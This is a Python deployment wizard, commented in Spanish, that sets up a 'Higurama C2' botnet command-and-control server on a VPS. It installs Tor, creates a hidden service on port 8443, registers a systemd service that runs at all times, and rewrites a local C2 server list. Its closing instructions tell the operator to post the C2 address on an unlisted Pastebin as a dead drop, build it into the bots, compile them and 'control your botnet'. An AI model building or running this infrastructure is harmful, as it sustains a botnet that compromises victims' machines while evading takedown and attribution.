#!/usr/bin/env python3
"""
Deploy Higurama C2 to VPS
Automated setup for 1984 Hosting or any VPS
"""

import subprocess
import sys
import json
import time
from datetime import datetime

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════╗
║     🚀 HIGURAMA VPS DEPLOYMENT WIZARD 🚀      ║
╚═══════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

def run_command(command, description, hide_output=False):
    """Ejecuta comando y muestra resultado"""
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} {description}...")
    
    try:
        if hide_output:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
        else:
            result = subprocess.run(command, shell=True, text=True)
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}[✓]{Colors.RESET} {description} completado")
            return True
        else:
            print(f"{Colors.RED}[✗]{Colors.RESET} Error en {description}")
            if hide_output and result.stderr:
                print(f"{Colors.RED}{result.stderr}{Colors.RESET}")
            return False
    except Exception as e:
        print(f"{Colors.RED}[✗]{Colors.RESET} Error: {e}")
        return False

def get_vps_info():
    """Obtiene información del VPS"""
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.BOLD}PASO 1: INFORMACIÓN DEL VPS{Colors.RESET}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}Tu servicio:{Colors.RESET} higurama.com[vpsraztyhfl]")
    print(f"{Colors.YELLOW}Provider:{Colors.RESET} 1984 Hosting (Islandia)")
    print(f"{Colors.YELLOW}Expira:{Colors.RESET} 2025-11-30 (21 días)\n")
    
    vps_ip = input(f"{Colors.CYAN}Ingresa la IP del VPS (Primary IP):{Colors.RESET} ").strip()
    
    print(f"\n{Colors.YELLOW}Opciones de autenticación:{Colors.RESET}")
    print(f"  {Colors.CYAN}[1]{Colors.RESET} SSH Key (recomendado)")
    print(f"  {Colors.CYAN}[2]{Colors.RESET} Contraseña root")
    
    auth_choice = input(f"\n{Colors.CYAN}Elige opción [1]:{Colors.RESET} ").strip() or "1"
    
    if auth_choice == "1":
        ssh_key_path = input(f"{Colors.CYAN}Ruta a SSH key [config/1984_ssh_key]:{Colors.RESET} ").strip()
        ssh_key_path = ssh_key_path or "config/1984_ssh_key"
        auth_method = {"type": "key", "path": ssh_key_path}
    else:
        root_password = input(f"{Colors.CYAN}Contraseña root:{Colors.RESET} ").strip()
        auth_method = {"type": "password", "password": root_password}
    
    return {
        "ip": vps_ip,
        "user": "root",
        "auth": auth_method
    }

def test_vps_connection(vps_info):
    """Prueba conexión al VPS"""
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.BOLD}PASO 2: PROBANDO CONEXIÓN{Colors.RESET}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}\n")
    
    if vps_info["auth"]["type"] == "key":
        cmd = f'ssh -i {vps_info["auth"]["path"]} -o StrictHostKeyChecking=no {vps_info["user"]}@{vps_info["ip"]} "echo Connection OK"'
    else:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Debes usar SSH key para deploy automático")
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Ejecuta: ssh-copy-id root@{vps_info['ip']}")
        return False
    
    return run_command(cmd, "Probando conexión SSH", hide_output=True)

def deploy_to_vps(vps_info):
    """Deploy completo al VPS"""
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.BOLD}PASO 3: DEPLOYING HIGURAMA{Colors.RESET}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}\n")
    
    ssh_base = f'ssh -i {vps_info["auth"]["path"]} {vps_info["user"]}@{vps_info["ip"]}'
    scp_base = f'scp -i {vps_info["auth"]["path"]}'
    
    commands = [
        # 1. Actualizar sistema
        (f'{ssh_base} "apt update && apt upgrade -y"', "Actualizando sistema"),
        
        # 2. Instalar dependencias
        (f'{ssh_base} "apt install -y python3 python3-pip python3-venv tor git"', "Instalando Python, Tor y Git"),
        
        # 3. Crear directorio
        (f'{ssh_base} "mkdir -p /opt/higurama"', "Creando directorio /opt/higurama"),
        
        # 4. Subir archivos principales
        (f'{scp_base} -r src/* {vps_info["user"]}@{vps_info["ip"]}:/opt/higurama/', "Subiendo código fuente"),
        (f'{scp_base} config/requirements.txt {vps_info["user"]}@{vps_info["ip"]}:/opt/higurama/', "Subiendo requirements.txt"),
        (f'{scp_base} cert.pem key.pem {vps_info["user"]}@{vps_info["ip"]}:/opt/higurama/', "Subiendo certificados SSL"),
        
        # 5. Crear entorno virtual y instalar dependencias
        (f'{ssh_base} "cd /opt/higurama && python3 -m venv venv"', "Creando entorno virtual Python"),
        (f'{ssh_base} "cd /opt/higurama && venv/bin/pip install -r requirements.txt"', "Instalando dependencias Python"),
        
        # 6. Configurar Tor Hidden Service
        (f'{ssh_base} "echo \'HiddenServiceDir /var/lib/tor/higurama_hidden_service\' >> /etc/tor/torrc"', "Configurando Tor (1/3)"),
        (f'{ssh_base} "echo \'HiddenServicePort 8443 127.0.0.1:8443\' >> /etc/tor/torrc"', "Configurando Tor (2/3)"),
        (f'{ssh_base} "systemctl restart tor"', "Reiniciando Tor"),
    ]
    
    for cmd, desc in commands:
        if not run_command(cmd, desc):
            print(f"\n{Colors.RED}[✗]{Colors.RESET} Deploy falló en: {desc}")
            return False
        time.sleep(1)
    
    return True

def get_onion_address(vps_info):
    """Obtiene la dirección .onion generada"""
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.BOLD}PASO 4: OBTENIENDO DIRECCIÓN .ONION{Colors.RESET}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}\n")
    
    ssh_base = f'ssh -i {vps_info["auth"]["path"]} {vps_info["user"]}@{vps_info["ip"]}'
    
    print(f"{Colors.YELLOW}[*]{Colors.RESET} Esperando a que Tor genere .onion (puede tomar 30s)...")
    time.sleep(30)
    
    cmd = f'{ssh_base} "cat /var/lib/tor/higurama_hidden_service/hostname"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0 and result.stdout.strip():
        onion_address = result.stdout.strip()
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}🧅 TU DIRECCIÓN .ONION:{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}{onion_address}{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")
        return onion_address
    else:
        print(f"{Colors.RED}[✗]{Colors.RESET} No se pudo obtener .onion. Intenta manualmente:")
        print(f"{Colors.YELLOW}ssh root@{vps_info['ip']} 'cat /var/lib/tor/higurama_hidden_service/hostname'{Colors.RESET}")
        return None

def create_systemd_service(vps_info):
    """Crea servicio systemd para autostart"""
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.BOLD}PASO 5: CONFIGURANDO AUTOSTART{Colors.RESET}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}\n")
    
    ssh_base = f'ssh -i {vps_info["auth"]["path"]} {vps_info["user"]}@{vps_info["ip"]}'
    
    service_content = f"""[Unit]
Description=Higurama C2 Server
After=network.target tor.service

[Service]
Type=simple
User=root
WorkingDirectory=/opt/higurama
ExecStart=/opt/higurama/venv/bin/python /opt/higurama/higurama.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    
    # Crear archivo temporal local
    with open("higurama.service.tmp", "w") as f:
        f.write(service_content)
    
    commands = [
        (f'scp -i {vps_info["auth"]["path"]} higurama.service.tmp {vps_info["user"]}@{vps_info["ip"]}:/etc/systemd/system/higurama.service', 
         "Subiendo archivo de servicio"),
        (f'{ssh_base} "systemctl daemon-reload"', "Recargando systemd"),
        (f'{ssh_base} "systemctl enable higurama"', "Habilitando autostart"),
        (f'{ssh_base} "systemctl start higurama"', "Iniciando Higurama C2"),
    ]
    
    for cmd, desc in commands:
        if not run_command(cmd, desc):
            return False
        time.sleep(1)
    
    # Limpiar archivo temporal
    subprocess.run("del higurama.service.tmp", shell=True, capture_output=True)
    
    return True

def update_local_config(vps_ip, onion_address):
    """Actualiza c2_servers.json local"""
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.BOLD}PASO 6: ACTUALIZANDO CONFIGURACIÓN LOCAL{Colors.RESET}")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════{Colors.RESET}\n")
    
    try:
        with open('config/c2_servers.json', 'r') as f:
            config = json.load(f)
        
        # Actualizar servidor primary con .onion
        config['c2_servers'][0]['address'] = onion_address
        
        # Actualizar fallback con IP del VPS
        config['c2_servers'][1]['address'] = vps_ip
        config['c2_servers'][1]['description'] = "VPS 1984 IP directa (backup)"
        
        # Actualizar timestamp
        config['last_updated'] = datetime.utcnow().isoformat() + 'Z'
        
        with open('config/c2_servers.json', 'w') as f:
            json.dump(config, f, indent=2)
        
        print(f"{Colors.GREEN}[✓]{Colors.RESET} c2_servers.json actualizado")
        return True
    
    except Exception as e:
        print(f"{Colors.RED}[✗]{Colors.RESET} Error actualizando config: {e}")
        return False

def show_next_steps(vps_ip, onion_address):
    """Muestra los siguientes pasos"""
    print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}✅ ¡DEPLOY COMPLETADO EXITOSAMENTE!{Colors.RESET}")
    print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")
    
    print(f"{Colors.BOLD}📊 INFORMACIÓN DEL SERVIDOR:{Colors.RESET}\n")
    print(f"  {Colors.CYAN}IP del VPS:{Colors.RESET} {vps_ip}")
    print(f"  {Colors.CYAN}Dirección .onion:{Colors.RESET} {onion_address}")
    print(f"  {Colors.CYAN}Puerto C2:{Colors.RESET} 8443")
    print(f"  {Colors.CYAN}Estado:{Colors.RESET} {Colors.GREEN}ONLINE 24/7{Colors.RESET}\n")
    
    print(f"{Colors.BOLD}🚀 PRÓXIMOS PASOS:{Colors.RESET}\n")
    
    print(f"{Colors.BOLD}1. Sube c2_servers.json a Pastebin:{Colors.RESET}")
    print(f"   • Ve a https://pastebin.com/")
    print(f"   • Pega contenido de {Colors.CYAN}config/c2_servers.json{Colors.RESET}")
    print(f"   • Visibility: {Colors.YELLOW}Unlisted{Colors.RESET}")
    print(f"   • Copia URL RAW\n")
    
    print(f"{Colors.BOLD}2. Actualiza src/higurashi.py:{Colors.RESET}")
    print(f"   • Línea 45-46: JSON_URLS")
    print(f"   • Pega tu URL de Pastebin\n")
    
    print(f"{Colors.BOLD}3. Compila bots:{Colors.RESET}")
    print(f"   {Colors.CYAN}python scripts/COMPILE_NOW.bat{Colors.RESET}\n")
    
    print(f"{Colors.BOLD}4. Conecta a tu C2:{Colors.RESET}")
    print(f"   {Colors.CYAN}ssh root@{vps_ip}{Colors.RESET}")
    print(f"   {Colors.CYAN}systemctl status higurama{Colors.RESET}")
    print(f"   {Colors.CYAN}journalctl -u higurama -f{Colors.RESET}  (ver logs en tiempo real)\n")
    
    print(f"{Colors.BOLD}5. Controla tu botnet:{Colors.RESET}")
    print(f"   • Los bots se conectarán automáticamente a tu .onion")
    print(f"   • Puedes apagar tu PC, el VPS sigue corriendo")
    print(f"   • Para ver C2 interface: conecta por SSH y usa screen/tmux\n")
    
    print(f"{Colors.YELLOW}⚠️  IMPORTANTE:{Colors.RESET}")
    print(f"   • Tu VPS expira: {Colors.RED}2025-11-30{Colors.RESET} (renueva antes)")
    print(f"   • Backups: {Colors.CYAN}ssh root@{vps_ip} 'tar -czf backup.tar.gz /opt/higurama'{Colors.RESET}")
    print(f"   • Logs: {Colors.CYAN}/opt/higurama/*.log{Colors.RESET}\n")

def main():
    print_banner()
    
    print(f"{Colors.YELLOW}Este wizard configurará Higurama C2 en tu VPS de 1984 Hosting{Colors.RESET}")
    print(f"{Colors.YELLOW}Asegúrate de tener:{Colors.RESET}")
    print(f"  • SSH key configurada")
    print(f"  • Acceso root al VPS")
    print(f"  • Archivos en {Colors.CYAN}src/{Colors.RESET} y {Colors.CYAN}config/{Colors.RESET}\n")
    
    input(f"{Colors.CYAN}Presiona Enter para continuar...{Colors.RESET}")
    
    # Paso 1: Obtener info del VPS
    vps_info = get_vps_info()
    
    # Paso 2: Probar conexión
    if not test_vps_connection(vps_info):
        print(f"\n{Colors.RED}[✗]{Colors.RESET} No se pudo conectar al VPS")
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Verifica:")
        print(f"  • IP correcta")
        print(f"  • SSH key agregada al VPS")
        print(f"  • Firewall permite SSH (puerto 22)")
        sys.exit(1)
    
    # Paso 3: Deploy
    if not deploy_to_vps(vps_info):
        print(f"\n{Colors.RED}[✗]{Colors.RESET} Deploy falló. Revisa los errores arriba.")
        sys.exit(1)
    
    # Paso 4: Obtener .onion
    onion_address = get_onion_address(vps_info)
    if not onion_address:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Continúa manualmente para obtener .onion")
        sys.exit(1)
    
    # Paso 5: Autostart
    if not create_systemd_service(vps_info):
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Servicio no configurado, pero C2 está instalado")
    
    # Paso 6: Actualizar config local
    update_local_config(vps_info["ip"], onion_address)
    
    # Mostrar pasos finales
    show_next_steps(vps_info["ip"], onion_address)

if __name__ == "__main__":
    main()
